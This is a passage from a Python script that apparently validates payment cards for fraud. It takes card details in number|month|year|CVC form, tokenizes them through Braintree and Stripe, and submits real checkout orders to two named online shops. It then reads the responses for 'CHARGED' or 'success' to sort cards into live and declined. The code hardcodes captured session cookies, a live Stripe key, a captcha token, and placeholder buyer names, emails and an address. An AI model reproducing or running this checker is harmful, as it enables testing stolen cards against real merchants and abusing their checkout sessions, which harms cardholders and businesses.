			existing_data = json.load(json_file)
		new_data = {
					'na' : {
		  "nonce": wpnonce_value,
		  "au": au
					}
				}
		
		existing_data.update(new_data)
		with open('gates.json', 'w') as json_file:
			json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('gates.json', 'r') as file:
		json_data = json.load(file)
	
	try:
		wpnonce_value=json_data['na']['nonce']
		au=json_data['na']['au']
		r = requests.session()
		import pickle
		import http.cookiejar
		with open('cookies.pkl', 'rb') as f:
			cookies = pickle.load(f)
		r = requests.session()
		r.cookies = cookies
	except Exception as e:
		print(e)
		up()
	
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '0d3d244a-e386-42db-a3cf-c53dbfa59661',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
	    'Accept-Language': 'en-US,en;q=0.9',
	    'Connection': 'keep-alive',
	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'Cookie': 'pbid=c624700819dcfee6b90da559faf2fa7574c4a24dfd7c328abfb5b52450bae868; AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; pys_session_limit=true; pys_start_session=true; nf23510_services_exp=956-475-150; _gcl_au=1.1.642801807.1714503977; __mmapiwsid=018f3066-87b2-753d-9c13-d4fd5d0ad299:f647beef5fde452d645193df227ee98298625cfe; dicbo_id=%7B%22dicbo_fetch%22%3A1714503977896%7D; _gid=GA1.2.190847686.1714503978; BVBRANDID=b637cd6b-8839-44e9-b3d9-e809816e1bbb; BVBRANDSID=f2314ea8-2470-477f-b233-f638664bd3d1; _fbp=fb.1.1714503978899.1306199105; wp-wpml_current_language=en; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://www.paintsupply.com/; __qca=P0-562375610-1714503985860; PHPSESSID=va9arj9imrer78l037o112146n; shoppingfeeder=51779114c5106389; ctm_data=%5B%7B%22product_id%22%3A30856%2C%22manufacturer_id%22%3A168%2C%22minimun_req_type%22%3A%22cases%22%2C%22minimum_req_value%22%3A%22240%22%2C%22sfm_available%22%3A%22yes%22%7D%5D; woocommerce_items_in_cart=1; wp_woocommerce_session_8799450e5122eb37f5ddc09d45cc175b=t_44ddb7a3c642b9acb0c6e18aa34413%7C%7C1714676805%7C%7C1714673205%7C%7C4d9f325ad0211b4fb407c74154930e98; _gat_UA-38888967-2=1; _uetsid=b98c0690072411ef874725865fba3a19; _uetvid=b98d0220072411efb5e64b26ee5780e5; _ga=GA1.2.311586249.1714503978; _ga_T78BEZZ2B5=GS1.1.1714503978.1.1.1714504060.44.0.0; _ga_0YNMLT9GX6=GS1.1.1714503978.1.1.1714504060.44.0.0; woocommerce_cart_hash=16d5534ccc2ebf1b97cc1ed97d2d7a93; __kla_id=eyJjaWQiOiJZamt3WWpGbU5UVXRZak00TXkwMFltVTJMV0ZtWTJNdFpUa3hNVE5qTVRGaFlqWXgiLCIkcmVmZXJyZXIiOnsidHMiOjE3MTQ1MDM5NzgsInZhbHVlIjoiaHR0cHM6Ly93d3cucGFpbnRzdXBwbHkuY29tL2NhcnQvIiwiZmlyc3RfcGFnZSI6Imh0dHBzOi8vd3d3LnBhaW50c3VwcGx5LmNvbS9jYXJ0LyJ9LCIkbGFzdF9yZWZlcnJlciI6eyJ0cyI6MTcxNDUwNDA1NywidmFsdWUiOiJodHRwczovL3d3dy5wYWludHN1cHBseS5jb20vY2FydC8iLCJmaXJzdF9wYWdlIjoiaHR0cHM6Ly93d3cucGFpbnRzdXBwbHkuY29tL2NhcnQvIn0sIiRzb3VyY2UiOiJDaGVja291dCBTTVMgT3B0LUluIn0=',
	    'Origin': 'https://www.paintsupply.com',
	    'Referer': 'https://www.paintsupply.com/checkout',
	    'Sec-Fetch-Dest': 'empty',
	    'Sec-Fetch-Mode': 'cors',
	    'Sec-Fetch-Site': 'same-origin',
	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'X-Requested-With': 'XMLHttpRequest',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	}
	
	params = {
	    'wc-ajax': 'checkout',
	}
	
	data = {
	    'ship_to_different_address': '1',
	    'shipping_first_name': 'mska',
	    'shipping_last_name': 'wj',
	    'shipping_company': '',
	    'shipping_country': 'US',
	    'shipping_address_1': '2058 Duncan Avenue',
	    'shipping_address_2': '',
	    'shipping_city': 'Huntington',
	    'shipping_state': 'NY',
	    'shipping_postcode': '11743',
	    'billing_phone': '2076516786',
	    'billing_email': 'visaspam77@gmail.com',
	    'kl_newsletter_checkbox': '1',
	    'po_number': '',
	    'how_hear_about': '',
	    'account_password': '',
	    'bill-to-same-address-as-shipping': '1',
	    'billing_first_name': 'mska',
	    'billing_last_name': 'wj',
	    'billing_company': '',
	    'billing_country': 'US',
	    'billing_address_1': '2058 Duncan Avenue',
	    'billing_address_2': '',
	    'billing_city': 'Huntington',
	    'billing_state': 'NY',
	    'billing_postcode': '11743',
	    'shipping_method[0]': 'table_rate:2:2',
	    'payment_method': 'braintree_credit_card',
	    'wc-braintree-credit-card-card-type': 'visa',
	    'wc-braintree-credit-card-3d-secure-enabled': '',
	    'wc-braintree-credit-card-3d-secure-verified': '',
	    'wc-braintree-credit-card-3d-secure-order-total': '16.93',
	    'wc_braintree_credit_card_payment_nonce': tok,
	    'wc-braintree-credit-card-tokenize-payment-method': 'true',
	    'wc_braintree_paypal_device_data': '{"correlation_id":"5c99f0867d8c9477c075fe67024252bc"}',
	    'wc_braintree_paypal_payment_nonce': '',
	    'wc_braintree_paypal_amount': '16.93',
	    'wc_braintree_paypal_currency': 'USD',
	    'wc_braintree_paypal_locale': 'en_us',
	    'ach_status': '',
	    '_wpnonce': wpnonce_value,
	    '_wp_http_referer': '/?wc-ajax=update_order_review',
	    'pys_utm': 'utm_source:undefined|utm_medium:undefined|utm_campaign:undefined|utm_term:undefined|utm_content:undefined',
	    'pys_utm_id': 'fbadid:undefined|gadid:undefined|padid:undefined|bingid:undefined',
	    'pys_browser_time': '22-23|Tuesday|April',
	    'pys_landing': 'https://www.paintsupply.com/',
	    'pys_source': 'direct',
	    'pys_order_type': 'normal',
	    'last_pys_landing': 'undefined',
	    'last_pys_source': 'undefined',
	    'last_pys_utm': 'utm_source:undefined|utm_medium:undefined|utm_campaign:undefined|utm_term:undefined|utm_content:undefined',
	    'last_pys_utm_id': 'fbadid:undefined|gadid:undefined|padid:undefined|bingid:undefined',
	}
	
	response = r.post('https://www.paintsupply.com/', params=params, cookies=r.cookies, headers=headers, data=data)
	last=response.text
	if 'CHARGED' in last or 'success' in last or 'Success' in last or 'Your payment has already been processed' in last or 'succeeded' in last or 'success' in last or 'Thank' in last:
		up()
		return 'success'
	elif 'Sorry, your session has expired.' in last:
		up()
		return 'Declined'
	try:
		m=(response.json()['messages'])
		m=m.split('class=\"woocommerce-error\">\n\t\t\t<li>')[1].split('</li>\n\t</ul>\n')[0]
		return m
	except:
		up()
		return 'Declined'
def sv(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'key=pk_live_Lk2wcr8WKXEORwr4he3GSzEL&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54&sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be&referrer=https%3A%2F%2Fwww.brandcrowd.com&time_on_page=27978&card[number]={n}&card[cvc]={cvc}&card[exp_month]=08&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYgOMResgdR8tVVFNz6ArhL0badnemc-IY332cxC2_RT129Rh1Ikfuyk36zFF-RySxke4a6eMVJlA_mD3GG9XWg_Dl9gxH8Duvd8AY2m8220XCcXDUTbgn8MNZQHYJTilwd60ePnVrY2hr0giMBzsyC-PFzl6PU9dGKMpDqCj4ZWszY8Hnp9s_RTTCCRow2HhjlZH7142PDQE2DkXrjQrVwniIiPa9DcpisxgRF4KXCm--kPhVyUnPklBhitoJyxL2QJw-S4oqX0YlPre18Tpmghricsh-jahZfnlc9Su1KTEipIolqrMnYsqza3dOkELAhC_61JYbAZGlaIOb87A7XbUd8LfszKYV-bFZhD1QO58NXyTH0pP_NPAZZJT2Ay7JMStWSCbxI-ze9_B8FX9BFtXKs5U5M1V7gmiqwjT9QCKInMuAWCR0lh-7kR0PtQyJGd4SRUAUylFbAJT92o70X1ssx_TPS6hLqYdvt6pWD82XpLCR49PzcdNjTFs-XBBO2_BwISfx3vVujrSPg7KhZw9kgvA22J91us5MkTlSBk0apP7_NFSe5mnAmJ2R_woIXdlm6ANTXaI7VZiXqUjL3ospqU0sVjYNunzzuhZgE1PsLtzvTb7mAVN3Ypi8v4tA6YG7q8bgNHg8LEIuWVoJ7smmGmW4wVs_c7vt-0PyP-tTzEhcYYB8n_oja2tb1yUJCkLgurWnqCa0IhmiT8eHEouA8uDi3bSGQOtsQ2hmcd0oqRv5dJ-phe37cWOxoWEyff5alVd6fGyhv2n79Qv47chzne9Hv5LPYJ4KYhE6wC2ntKbHgREEbe_Q9EAKgUqpmu6-tTx8uSSDEwTJh7_G_mr3QKHL-OXqRTJBOopsJTLvVZ4eucl_T2opGEgbybxT67YP-3YK0IY6xkHeDxbJydkocIrzffAhlIp3AwuHU-9NsMZdMT9N_DToGxwy3jT0wXIMAxXFS1sq7WkWWM20Nv4cFLReorGop597X-uZx-6jg8-x3YMmBBiATxKvLCdxLF_Rp2qi6yBwufT23hHtUabq0NmtN3P8ITO4sa-8e60XDHRslZ3u1r40ASSQxJvgksP47a79CybmonrJ-WFL10pK2LuvS1aa1ElYNBVBGoG_Cxk5xkgedIJTSUNlDAUxxWtx0IdrW0GwRTG83w1jZ6j49VXX0hLhy-h5IG0AN5Y1B14zvHkTtRwsTxuc1rz2i1IiqdsBY4qARNPXT33lyZwhpw_f4Er4AzY0gj9zVCT-nZeYBPCJfjk--fbyCQbuJ62DniQE7bFBwCzNKqW08F8wk4czJKLGJwvj6oJrcpIicWFp7r6uM3E3sQMM3caZCOMvYe0pl-D5bqRjmngHCjcIfKfuoCExUCD3WTZhCOWMmScpnf1Ko1CShzEa8N7QES0x-LQgh3694gK0WqEc4q7sOlXvbRTYBeWYizlV6v-waz5cBtwm03JrGPQnEWlQeKCA0Jti5dILqQL-kS9Q9V69vMsnuWcIbkWQ_EfkI4T3g5PatgwmIjIAyGSkJ6QA4N2rdUKIJaCG3lyxOMkqMgr4ePm6s11n6hX15ZKfg2Mrg0gBZC47x4hWNxcctyAEtJqMCriS61YeaYp6O9JYoxNQ80e3q7RNVZSWSmMtKGzG-UGjamhVEP5nsBhDvRhoG2g61OTWpz3K8jrOoiyVOU3nD79b-uY2j_EiKgG41_7rf8Hxz2l35TflgeFB0tKbQWgP9uKW3gGJh97DQ8qwpRPiHoq4DV96kR-DiHI5z1qKNQiyWyJe8VfhktzbSEqzYr1fddy2h6xZkNX-GxcjlKIBa_mEnbE62GHzTKcX6UjGOtCapBBsBhsiCJ2T2YngKTQ8_mFNCfiLYH5RJ2L4lkZeU9_jPFZYMFtYbLufTZXm6ceYeg3cwmqFR_UdozNym4MLdZFpkKcwD5CRkIUPZvQ-35DnSowx_LkFmYvp4-8JvKbMr_Lgj5obZm5Dq_HVvzElL4haUXJtMKqO9Z45THYsJULYX49r1-NBPJ6bvkQIA4x50kma6FscgAK7GMjVMRlCGzsC-HrN2U9F69eyqwaUKCKWM2rDzHhibyaKWAzSjZXhwzmZHeKioc2hhcmRfaWTOAzGDb6JrcqgzNDE3OWE4ZKJwZAA.uKPrI9DFPyAAy5YHaxw9ML99H7z9q6y_pFG2MRbJkJU&payment_user_agent=stripe.js%2F315906f414%3B+stripe-js-v3%2F315906f414%3B+split-card-element'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	cookies = {
	    'bc_a': 'CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6',
	    'ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D',
	    '__stripe_mid': '8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54',
	    '_gcl_au': '1.1.1204692422.1715832241',
	    '_ga': 'GA1.1.1542255616.1715832242',
	    '_fbp': 'fb.1.1715832242582.1432169573',
	    '_tt_enable_cookie': '1',
	    '_ttp': 'BPXdM3jII8Ha5tePvZzAaP8r5sO',
	    'brandcrowd-user-session-id': '5b01b3b0-4dcf-bf57-f2c2-b308af000a3c',
	    'bc_s': 'CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP',
	    'ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616': '%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D',
	    'mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D',
	    '.AspNetCore.Antiforgery.TcmPAuy1nOM': 'CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q',
	    '__stripe_sid': 'bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be',
	    '_uetsid': '7180d090146211ef89aded17c728abeb',
	    '_uetvid': '86617bc0d01d11ee9148db38439bde60',
	    '_ga_FFRLYW6TZ1': 'GS1.1.1715959850.2.1.1715959851.59.0.0',
	    'brandcrowd-search': 'DefaultSearchV4',
	    'bc-gt-2469-local-pricing-lower-wtp': 'gt-2469-variation-1',
	    'bc-gt-4683-three-package-pricing': 'gt-4683-disabled',
	    'bc-gt-2728-2-year-subs': 'gt-2728-disabled',
	    'brandcrowd-price-context': '25OFFSEM',
	    'bc-gt-4692-free-logos-2024': 'gt-4692-excluded',
	    'bc-gt-5041-cookie-consent-alternatives': 'gt-5041-excluded',
	    'bc-gt-5292-auth-copy-validity': 'gt-5292-variation-1',
	}
	
	headers = {
	    'authority': 'www.brandcrowd.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    # 'cookie': 'bc_a=CfDJ8IvzqFzHTtFGoh34l-99SRY7oWAc10G-K7k3nMjvLFN8oK57yIunkGFVP0EpjjPiRMuDpJyfQxYW8ne1v-JawlnOw5ypoAk_0Okr6Uae_vGyf0xRLDpU93LW_JSCQZxzKlMbXa69th4VAdFfwh2rQ7fCSsD_N8WNwd4b5-ewbpyL83kvUcc5FWMY99XPngmYzCzejcUZl7uMb2OiBcShftgiTQ6FebGT5buB9-krcy1-MCRuqiARpcbIYfZyjYEPbJc5goAH930FXL6R6GU1CbS61pvYtRtXaEeTrNFjqhnOCgG4U7SOU1lVdAmga0-RCaulTfCPcca3KoJNzodwka82PddM7yldUO6K-WDNbGY3skD9Wz0VqXy1tJFydmG7RfQX9pYCaN6b9-3eUZIKP0t8bR969OjAI7K0Ir2Eo8qTXpXAT6KLdbmERxOK2xdXyfKM6M_aoQoo5Uq4GRuCzkobILoXUuAp4Pq5cSv0666an1zJQH8QqZ_AmVI8IRs6Ze3E8i55fJkMl1hOPs2Yiq0xsEUnrCHXJk7i_eZFd1kxNjg7KcZIpT8R9nu5SiirRU9_EkdXrKBNRofDZY8ECxBe-vsbyWJLMDM3BDkKv10yD5FLLmnOUAN-f9e6yEoMmm_-liKfANQRr8edtEbyZrvjy1bsZyz43ZRbqGcNUFliC9p6wswGotlXlZeGviekuCQvAG0ml6UlvCiyUmbWMxFTkZTCTuB5PaOkxlzxSJqOs2AREASo7xgIbfMB_ql43VtZIVwKwF0r0R06s-w9l6hGKXyorj4cywwSTMyhCpr2JSpdv0xbdSS5R4PtXGa46d0mWMZlrIa94PFt8rJ1cyNSlnnvQcXWcSYx3PdnLua8eVUCaU3cuC_rCafjvjNmSsdYkJjSpUqQ2qjF43edUenueGZ6jSInRNqYn4CEis_Y15uXBEelgYOCXfDbJnT0hHAjMKeAN8cZS0rzc_Mg7GA8oWbPFMAcZoe3AIn-jYeELhakFDLNVNZeZEprKhs0Kq5Zh6EqxGPdYmavUkVwuAcE28ZEDNEEysQaPk1b8f7DjfoBdGAdo41zf5pqcJ92WwOoe2jQ7v1Z82935BwaM78lnDsbKkluIk0bgm5qoFFYJi71mErwnq2YHDiJso5kEhtJCFKquzmlhL1YvTs1evwP3fPtyIA_06hz45I-AXnqbLtKHEHDn_oeT9_rVt6SeAhUfiXQF2hJaZWU9iuOCNh1he_f6br7UHJGTtXmUCcgn5yj0Ri7Y-i8dAzZyKL8kEOVeBiBnwGKo36OEopPb5jTo77elMMJwA-1-Wh7dTr-uQg4Vct-MrfgQA_XdpkfqLhLuQFIN2laGmpU_vJOhPrW7J2GptUAEMSqh8JYO6pn_eo9etBBkRK0ZyA9lHcrNj981dyQikHH5OPSZmfANUW6GU8874On6Qp0vEJFOUoDL94SQyVtCArBWJuvqD3dhB6HtIu8f2INQ9MSD3hgpNKjbJ172Pqq01EB5RuXiqCJAXUXIkYi1a6K9GgEWRXq-uHZ-9lE0oTzVimYM002QQWezoF_hFWqbowasQcp_8W6; ab.storage.userId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%2239a7fd30-d222-418a-bfd1-1d6618a66987%22%2C%22c%22%3A1715832234405%2C%22l%22%3A1715832234405%7D; __stripe_mid=8235a651-2067-492a-9a35-e7eb1863e2c4c9ae54; _gcl_au=1.1.1204692422.1715832241; _ga=GA1.1.1542255616.1715832242; _fbp=fb.1.1715832242582.1432169573; _tt_enable_cookie=1; _ttp=BPXdM3jII8Ha5tePvZzAaP8r5sO; brandcrowd-user-session-id=5b01b3b0-4dcf-bf57-f2c2-b308af000a3c; bc_s=CfDJ8IvzqFzHTtFGoh34l%2B99SRbG5eA35O5x2hhLOXtP2UbzZYJJOhfUttYNBI5Ch03Tg3CgxaOMpgyRRT0nSlpi75%2Fr%2FT5l%2FIDDMpa5zzEodNuJku6ozMMa%2BLXVNV6ifgskIlT2q2vOZPH2mqu2ObF51hMtEkWWC0LKzn%2FS1kF0otzP; ab.storage.sessionId.10402dcf-98a1-474c-92da-ec52a09a8616=%7B%22g%22%3A%22e7d76a1a-78e4-7faa-cf2a-3aa0d60d44c3%22%2C%22e%22%3A1715961640890%2C%22c%22%3A1715959840895%2C%22l%22%3A1715959840895%7D; mp_878a43cbe7b74f3d409d4392b3c63831_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24device_id%22%3A%20%2218f7f9227abda3-02ec169f878bb7-b457550-46500-18f7f9227afda7%22%2C%22%24initial_referrer%22%3A%20%22%24direct%22%2C%22%24initial_referring_domain%22%3A%20%22%24direct%22%2C%22utm_source%22%3A%20null%2C%22utm_medium%22%3A%20null%2C%22utm_campaign%22%3A%20null%2C%22utm_content%22%3A%20null%2C%22utm_term%22%3A%20null%7D; .AspNetCore.Antiforgery.TcmPAuy1nOM=CfDJ8IvzqFzHTtFGoh34l-99SRbEwYfUT7toqE-1-OyjriQn8yvjPhVNqvSroUVsI5NXFZM0Ukz-BAN-fSYJM3VVH0Ta3muBALlhmMBrhf_E3xUs4m77feAQ7GJ8ty5Xzlp_aJELnwLTRBKnIOffpHGUZ9Q; __stripe_sid=bcfeeb0e-51b5-4eb5-a37b-840b0d0b9024b7c8be; _uetsid=7180d090146211ef89aded17c728abeb; _uetvid=86617bc0d01d11ee9148db38439bde60; _ga_FFRLYW6TZ1=GS1.1.1715959850.2.1.1715959851.59.0.0; brandcrowd-search=DefaultSearchV4; bc-gt-2469-local-pricing-lower-wtp=gt-2469-variation-1; bc-gt-4683-three-package-pricing=gt-4683-disabled; bc-gt-2728-2-year-subs=gt-2728-disabled; brandcrowd-price-context=25OFFSEM; bc-gt-4692-free-logos-2024=gt-4692-excluded; bc-gt-5041-cookie-consent-alternatives=gt-5041-excluded; bc-gt-5292-auth-copy-validity=gt-5292-variation-1',
	    'origin': 'https://www.brandcrowd.com',
	    'referer': 'https://www.brandcrowd.com/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'CartToken': '77b446d1-833b-4e33-9b56-71fe5ce24348',
	    'IsPaymentRequired': 'true',
	    'PayerToken': id,
	    'WalletType': '',
	    'SelectedDiscountCode': '',
	    'SelectedTaxId': '',
	    'PurchaseInstructions': '',
	    'IsFreeTrial': 'false',
	    'UserEmail': 'markkeep72@gmail.com',
	    'ShippingAddress.Name': '',
	    'ShippingAddress.Street1': '',
	    'ShippingAddress.Street2': '',
	    'ShippingAddress.City': '',
	    'ShippingAddress.State': '',
	    'ShippingAddress.ZipCode': '',
	    'ShippingAddress.Country': '',
	    'ShippingAddress.Id': '0',
	    'ShippingAddress.IsPrimary': 'true',
	    'PayerTokenType': 'stripe',
	}
	
	response = requests.post(
	    'https://www.brandcrowd.com/maker/checkout/77b446d1-833b-4e33-9b56-71fe5ce24348',
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	last=(response.text)
	soup = BeautifulSoup(last, 'html.parser')	
	if not 'tight">Error</p><' in last:
		if 'success' in last or 'Thank' in last or 'Subscribed' in last:
			return 'success'
	else:
		result = soup.find('p', class_='tw-text-base tw-text-white tw-m-0 tw-leading-tight tw-mb-2 lg:tw-mb-0')
		if result:
			return(result.text)
		else:
			return '#Your card has been declined'
def stn(card):
	import re
	card = card.strip()
	parts = re.split('[|]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
